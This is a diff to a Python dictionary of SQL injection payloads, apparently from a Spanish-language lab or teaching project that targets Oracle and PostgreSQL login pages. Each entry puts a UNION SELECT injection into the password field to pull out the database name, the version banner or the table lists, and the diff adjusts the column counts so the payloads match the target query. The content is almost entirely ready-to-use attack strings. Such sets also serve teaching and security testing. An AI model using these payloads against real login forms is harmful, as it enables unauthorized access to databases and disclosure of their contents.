@@ -71,12 +71,12 @@ sql_injections = {
             {
                 "nombre":"Nombre de la BD (Oracle)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd FROM dual --"
+                "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd_relleno_1, NULL AS nombre_bd_relleno_2 FROM dual --"
             },
             {
                 "nombre":"Versión de la BD (Oracle)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT NULL, banner, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
+                "password":"cualquier_input' UNION SELECT NULL, banner, NULL, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
             },
             {
                 "nombre":"Nombre de la BD (PostgreSQL)",
@@ -86,22 +86,22 @@ sql_injections = {
             {
                 "nombre":"Versión de la BD (PostgreSQL)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT NULL, version(), NULL; --"
+                "password":"cualquier_input' UNION SELECT NULL, version(), NULL, NULL; --"
             },
             {
                 "nombre":"Todas las tablas en la BD (Oracle)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
+                "password":"cualquier_input' UNION SELECT 1, NULL, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
             },
             {
                 "nombre":"Todas las tablas en la BD (PostgreSQL)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
+                "password":"cualquier_input' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
             },
             {
                 "nombre":"Todas las tablas en la BD (Oracle Filtrado)",
                 "usuario":"cualquier_input",
-                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
+                "password":"cualquier_input' UNION SELECT 1, NULL, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
             }
         ],
         "route_oracle": "login_oracle_union",
